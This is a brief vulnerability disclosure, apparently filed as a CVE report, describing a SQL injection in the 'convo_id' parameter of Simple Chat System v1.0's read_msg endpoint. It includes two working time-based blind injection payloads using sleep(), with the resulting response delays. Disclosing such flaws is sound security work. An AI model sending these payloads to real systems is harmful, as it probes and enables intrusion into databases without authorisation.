# Simple Chat System v1.0 has SQL injection

BUG_Author：sikii

Website source address: https://www.sourcecodester.com/php/14516/simple-chat-system-using-phpmysql-and-websocket-source-code.html

Vulnerability URL: /chat/ajax.php?action=read_msg

POST parameter 'convo_id' exists SQL injection vulnerability

Payload1: convo_id=1' and (select 2 from (select(sleep(10)))t) and 'q'='q&user_id=2

The response time is 10 seconds.

![image](https://github.com/sikii7/CVE/blob/main/pic/sql1.png)

Payload2: convo_id=1' and (select 2 from (select(sleep(15)))t) and 'q'='q&user_id=2

The response time is 15 seconds.

![image](https://github.com/sikii7/CVE/blob/main/pic/sql2.png)
